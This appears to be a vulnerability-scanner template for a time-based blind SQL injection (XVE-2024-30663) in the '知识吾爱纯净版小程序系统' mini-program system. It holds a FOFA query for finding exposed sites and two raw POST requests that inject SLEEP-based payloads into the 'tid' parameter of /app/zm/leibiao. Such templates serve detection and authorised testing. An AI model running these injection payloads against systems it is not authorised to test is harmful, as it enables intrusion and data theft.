id: zhishiwuai-leibiao-sql-XVE-2024-30663

info:
  tags: zhishiwuai-leibiao-sql-XVE-2024-30663
  name: 知识吾爱纯净版小程序系统 leibiao SQL注入漏洞(XVE-2024-30663)
  author: xc
  severity: high
  description: |-
    fofa: body="域名/skdjfdf"
    知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。



http:
  - raw:
      - |
        POST /app/zm/leibiao HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        tid=(CASE WHEN (3711=3711) THEN SLEEP(4) ELSE 3711 END)
      - |
        POST /app/zm/leibiao HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        tid=(CASE WHEN (3711=3711) THEN SLEEP(8) ELSE 3711 END)

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and

